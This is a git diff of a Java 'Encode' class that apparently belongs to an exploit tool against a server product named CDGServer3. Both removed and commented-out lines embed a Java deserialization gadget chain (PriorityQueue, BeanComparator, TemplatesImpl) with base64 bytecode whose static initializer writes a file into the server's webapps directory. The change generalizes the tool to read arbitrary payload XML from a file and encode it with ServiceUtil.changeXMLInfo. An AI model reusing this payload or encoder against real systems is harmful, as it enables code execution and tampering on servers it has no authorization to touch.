@@ -3,41 +3,41 @@ package com.cdg;
 import java.io.*;
 
 public class Encode {
-    public static void main(String[] args) {
-        String var0 = "<java.util.PriorityQueue serialization=\"custom\">\n" +
-                "  <unserializable-parents/>\n" +
-                "  <java.util.PriorityQueue>\n" +
-                "    <default>\n" +
-                "      <size>2</size>\n" +
-                "      <comparator class=\"org.apache.commons.beanutils.BeanComparator\">\n" +
-                "        <property>outputProperties</property>\n" +
-                "        <comparator class=\"java.lang.String$CaseInsensitiveComparator\"/>\n" +
-                "      </comparator>\n" +
-                "    </default>\n" +
-                "    <int>3</int>\n" +
-                "    <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl " +
-                "serialization=\"custom\">\n" +
-                "      <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n" +
-                "        <default>\n" +
-                "          <__name>P</__name>\n" +
-                "          <__bytecodes>\n" +
-                "            " +
-                "<byte-array" +
-                ">yv66vgAAADEAIgEAEFQzNzQ3NTQ0Njk4MTcwNjAHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEAFVQzNzQ3NTQ0Njk4MTcwNjAuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAGGphdmEvaW8vRmlsZU91dHB1dFN0cmVhbQcACgEAJi4uLy93ZWJhcHBzLy9DREdTZXJ2ZXIzLy90ZXN0dHR0dHQudHh0CAAMAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAOAA8KAAsAEAEABXdyaXRlAQAFKFtCKVYMABIAEwoACwAUAQANU3RhY2tNYXBUYWJsZQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABcBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKBa0gk/OR3e8+AQANQ29uc3RhbnRWYWx1ZQwADgAICgAYACAAIQACABgAAQAaAAEAGgAbABwAAQAfAAAAAgAdAAIACAAHAAgAAQAJAAAATwAGAAIAAAA6pwADAUy7AAtZEg23ABEQBrwIWQMQYZFUWQQQYpFUWQUQY5FUWQYQMZFUWQcQMpFUWQgQM5FUtgAVsQAAAAEAFgAAAAMAAQMAAQAOAAgAAQAJAAAAEQABAAEAAAAFKrcAIbEAAAAAAAEABQAAAAIABg==</byte-array>\n" +
-                "            " +
-                "<byte-array" +
-                ">yv66vgAAADEAEwEAA0ZvbwcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAApTb3VyY2VGaWxlAQAIRm9vLmphdmEBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQcABwEAEHNlcmlhbFZlcnNpb25VSUQBAAFKBXHmae48bUcYAQANQ29uc3RhbnRWYWx1ZQEABjxpbml0PgEAAygpVgwADgAPCgAEABABAARDb2RlACEAAgAEAAEACAABABoACQAKAAEADQAAAAIACwABAAEADgAPAAEAEgAAABEAAQABAAAABSq3ABGxAAAAAAABAAUAAAACAAY=</byte-array>\n" +
-                "          </__bytecodes>\n" +
-                "          <__transletIndex>-1</__transletIndex>\n" +
-                "          <__indentNumber>0</__indentNumber>\n" +
-                "        </default>\n" +
-                "        <boolean>false</boolean>\n" +
-                "      </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n" +
-                "    </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n" +
-                "    <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl reference=\"." +
-                "./com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"/>\n" +
-                "  </java.util.PriorityQueue>\n" +
-                "</java.util.PriorityQueue>";
+    public static void encoder(String filePath) {
+//        String var0 = "<java.util.PriorityQueue serialization=\"custom\">\n" +
+//                "  <unserializable-parents/>\n" +
+//                "  <java.util.PriorityQueue>\n" +
+//                "    <default>\n" +
+//                "      <size>2</size>\n" +
+//                "      <comparator class=\"org.apache.commons.beanutils.BeanComparator\">\n" +
+//                "        <property>outputProperties</property>\n" +
+//                "        <comparator class=\"java.lang.String$CaseInsensitiveComparator\"/>\n" +
+//                "      </comparator>\n" +
+//                "    </default>\n" +
+//                "    <int>3</int>\n" +
+//                "    <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl " +
+//                "serialization=\"custom\">\n" +
+//                "      <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n" +
+//                "        <default>\n" +
+//                "          <__name>P</__name>\n" +
+//                "          <__bytecodes>\n" +
+//                "            " +
+//                "<byte-array" +
+//                ">yv66vgAAADEAIgEAEFQzNzQ3NTQ0Njk4MTcwNjAHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEAFVQzNzQ3NTQ0Njk4MTcwNjAuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAGGphdmEvaW8vRmlsZU91dHB1dFN0cmVhbQcACgEAJi4uLy93ZWJhcHBzLy9DREdTZXJ2ZXIzLy90ZXN0dHR0dHQudHh0CAAMAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAOAA8KAAsAEAEABXdyaXRlAQAFKFtCKVYMABIAEwoACwAUAQANU3RhY2tNYXBUYWJsZQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABcBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKBa0gk/OR3e8+AQANQ29uc3RhbnRWYWx1ZQwADgAICgAYACAAIQACABgAAQAaAAEAGgAbABwAAQAfAAAAAgAdAAIACAAHAAgAAQAJAAAATwAGAAIAAAA6pwADAUy7AAtZEg23ABEQBrwIWQMQYZFUWQQQYpFUWQUQY5FUWQYQMZFUWQcQMpFUWQgQM5FUtgAVsQAAAAEAFgAAAAMAAQMAAQAOAAgAAQAJAAAAEQABAAEAAAAFKrcAIbEAAAAAAAEABQAAAAIABg==</byte-array>\n" +
+//                "            " +
+//                "<byte-array" +
+//                ">yv66vgAAADEAEwEAA0ZvbwcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAApTb3VyY2VGaWxlAQAIRm9vLmphdmEBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQcABwEAEHNlcmlhbFZlcnNpb25VSUQBAAFKBXHmae48bUcYAQANQ29uc3RhbnRWYWx1ZQEABjxpbml0PgEAAygpVgwADgAPCgAEABABAARDb2RlACEAAgAEAAEACAABABoACQAKAAEADQAAAAIACwABAAEADgAPAAEAEgAAABEAAQABAAAABSq3ABGxAAAAAAABAAUAAAACAAY=</byte-array>\n" +
+//                "          </__bytecodes>\n" +
+//                "          <__transletIndex>-1</__transletIndex>\n" +
+//                "          <__indentNumber>0</__indentNumber>\n" +
+//                "        </default>\n" +
+//                "        <boolean>false</boolean>\n" +
+//                "      </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n" +
+//                "    </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n" +
+//                "    <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl reference=\"." +
+//                "./com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"/>\n" +
+//                "  </java.util.PriorityQueue>\n" +
+//                "</java.util.PriorityQueue>";
 //        String var0 = "<java.util.PriorityQueue serialization=\"custom\">\n" +
 //                "  <unserializable-parents/>\n" +
 //                "  <java.util.PriorityQueue>\n" +
@@ -74,8 +74,20 @@ public class Encode {
 //                "</java.util.PriorityQueue>";
 
         try {
-            String str1 = ServiceUtil.changeXMLInfo(var0);
-            System.out.println(str1);
+            //String filePath = "/Users/admin/Downloads/CDGDEcodeXML-main/out/artifacts/CDGDEcodeXML_jar/test.xml";
+            File file = new File(filePath);
+            BufferedReader br = new BufferedReader(new FileReader(file));
+            String st;
+            String Content = "";
+            while ((st = br.readLine()) != null){
+                if(!Content.equals("")){
+                    Content = Content +"\n";
+                }
+                Content = Content + st;
+            }
+            //System.out.println(Content);
+            String result = ServiceUtil.changeXMLInfo(Content);
+            System.out.println(result);
         } catch (Exception e) {
             e.printStackTrace();
         }
